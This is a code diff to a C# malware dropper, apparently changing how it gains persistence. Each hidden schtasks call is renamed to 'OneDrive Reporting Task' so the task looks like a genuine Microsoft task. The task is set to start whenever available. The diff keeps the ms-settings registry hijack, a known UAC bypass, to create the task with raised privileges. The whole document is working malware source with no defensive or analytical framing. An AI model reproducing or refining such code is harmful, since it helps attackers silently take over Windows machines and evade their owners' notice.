@@ -13,7 +13,7 @@ namespace dropper
             Process.Start(new ProcessStartInfo()
             {
                 FileName = "schtasks.exe",
-                Arguments = @"/delete /tn OneDrive /f",
+                Arguments = "/delete /tn \"OneDrive Reporting Task\" /f",
                 WindowStyle = ProcessWindowStyle.Hidden
             }).WaitForExit();
 
@@ -39,7 +39,7 @@ namespace dropper
     <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
     <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
     <AllowHardTerminate>false</AllowHardTerminate>
-    <StartWhenAvailable>false</StartWhenAvailable>
+    <StartWhenAvailable>true</StartWhenAvailable>
     <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
     <IdleSettings>
       <StopOnIdleEnd>true</StopOnIdleEnd>
@@ -64,7 +64,7 @@ namespace dropper
             Process.Start(new ProcessStartInfo()
             {
                 FileName = "cmd.exe",
-                Arguments = @"/c reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /f && reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /d ""schtasks /create /tn OneDrive /xml " + $"{ppath}\\temp.xml" + @""" /t REG_SZ /f",
+                Arguments = @"/c reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /f && reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /d ""schtasks /create /tn \""OneDrive Reporting Task\"" /xml " + $"{ppath}\\temp.xml" + @""" /t REG_SZ /f",
                 WindowStyle = ProcessWindowStyle.Hidden
             }).WaitForExit();
 
@@ -79,7 +79,7 @@ namespace dropper
             Process.Start(new ProcessStartInfo()
             {
                 FileName = "schtasks.exe",
-                Arguments = "/run /i /tn OneDrive",
+                Arguments = "/run /i /tn \"OneDrive Reporting Task\"",
                 WindowStyle = ProcessWindowStyle.Hidden
             }).WaitForExit();
 
